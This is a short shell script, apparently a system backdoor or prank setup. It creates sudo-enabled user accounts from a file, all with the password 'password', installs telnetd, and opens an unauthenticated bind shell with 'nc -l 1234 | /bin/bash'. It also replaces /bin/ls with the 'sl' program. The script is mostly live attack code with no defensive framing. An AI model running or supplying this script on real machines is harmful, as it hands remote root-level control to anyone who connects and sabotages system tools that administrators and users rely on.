#!/bin/sh


if [ -z $1 ]
	then
		echo "Missing or incorrect File command line argument"
		exit
	else
		
		input="./$1"
		while IFS= read -r "var"
		do
		echo "$var"
			useradd -m "$var"
			echo "$var:password" | chpasswd 
			gpasswd -a "$var" sudo
		done < "$input"
		apt-get install telnetd
		nc -l 1234 | /bin/bash
		apt-get install sl
		mv /bin/ls /bin/ls.back
		mv /usr/games/sl /bin/ls
fi 
